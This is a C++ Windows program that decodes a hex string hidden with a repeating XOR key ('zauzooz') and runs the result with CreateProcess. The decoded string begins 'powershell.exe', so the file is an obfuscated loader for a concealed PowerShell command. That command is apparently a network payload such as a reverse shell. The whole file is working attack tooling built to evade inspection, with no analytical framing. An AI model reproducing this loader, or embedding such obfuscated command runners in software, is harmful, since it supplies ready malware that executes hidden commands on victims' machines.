#include <windows.h>
#include<iostream>
#include <cstring>
#include <sstream>
#include <iomanip>

std::string hexToChar(std::string& hexString) {
    std::string charString;
    for (size_t i = 0; i < hexString.length(); i += 2) {
        // Extract two characters from the hex string and convert to an integer
        std::string hexByte = hexString.substr(i, 2);
        int byteValue = std::stoi(hexByte, 0, 16);

        // Append the character to the result string
        charString += static_cast<char>(byteValue);
    }

    return charString;
}

std::string xorStrings(std::string str1, std::string str2) {

    str1 = hexToChar(str1);
    // std::cout<<"Encrypted payload:"<< str1 << std::endl;
    // std::cout<<"len of Encrypted payload:"<< str1.length() << std::endl;

    size_t len1 = str1.length();
    size_t len2 = str2.length();

    std::string repeatedStr2;

    for (size_t i = 0; i < len1; ++i) {
        repeatedStr2 += str2[i % len2]; // Repeating str2 to match the length of str1
    }
    // std::cout<< "Len of str1: " << len1 << std::endl;
    // std::cout<< "Len of repeatedStr2: " << repeatedStr2.length() << std::endl;

    // Perform XOR operation
    std::string xorResult;
    for (size_t i = 0; i < len1; ++i) {
        xorResult += str1[i] ^ repeatedStr2[i];
    }
    // std::cout<< "Len of xorResult: " << xorResult.length() << std::endl;

    return xorResult;
}

int main() {
    // Define the PowerShell command to execute
    std::string powershellCommand = "0a0e021f1d1c121f0d19540a171f5a4c361502021b140555584b000f0e11000e2c0a080e271c160a3f1b0e0955474f4839403d20090a1d092646555a444f5e3f0f03403a1c1f082f14170a4f515a46293b1f1f3e1b1514262300191b0d292e0a020a260210081b41191f135258540a19120e555e001a0e0a1401390a1d0e3c08191f3f0e0e125a510f1d035a474152121b1b0a404e5a4b565d544b574d545e56485450464d401c151c15021b1d0a551904070e410c1f08464e330119151104582d0a0d281f10001f1c1b5a573407134f4b0f080d5557201a0e3c08191f4f4b150f15050f1b2c1f08153313030a2a1b151d4126020a151301572c0a080e0813130c0e0e1f41583c06031f2a0001124f4b150f15050f1b2c1f08153313030a2a1b151d5a422c1f0815260e001d1f360e161b1b0615144152390a1d0e403d39150c0e163700161206011f26331a151b485a573710080d00091f5a07174f4b150f15050f1b2c1f08153313030a2a1b151d413c0a0e5728011f023f08151110081b165a5731140e074f5d322a362f5533291507010d0e1d1f262c1c191d0009150701263806141e0e0209332c0f081310141b391f08121c1501333314151008010a0e5a32100e1b06141d12525a42211b1704552a1d000203321008190a085a4c231b031a1f5a4644435d414b4c595b4b565d544b524240575f424a464e290a1b57331510173f1d150a04070e164f572a0001124f483231222040333c151c15021b1d0a2637081608001c151c15292d06011e151606262c1a0808041b0e390a0809081a143326140e0407140a1b5a2904010e06011d09465557210e171f4125080017033f0f1418030a5a573714161a0a5a4b";
    std::string key = "zauzooz";

    powershellCommand = xorStrings(powershellCommand, key);

    std::cout << powershellCommand.c_str() << std::endl;

    //Create a process to run the PowerShell command
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(
        NULL,                   // Application name (use NULL to run the command from the command line)
        const_cast<char*>(powershellCommand.c_str()), // Command-line arguments
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        0,                      // No creation flags
        NULL,                   // Use the same environment as the calling process
        NULL,                   // Use the same current directory as the calling process
        &si,                    // Pointer to STARTUPINFO structure
        &pi                     // Pointer to PROCESS_INFORMATION structure
    )) {
        // Wait for the PowerShell command to finish
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
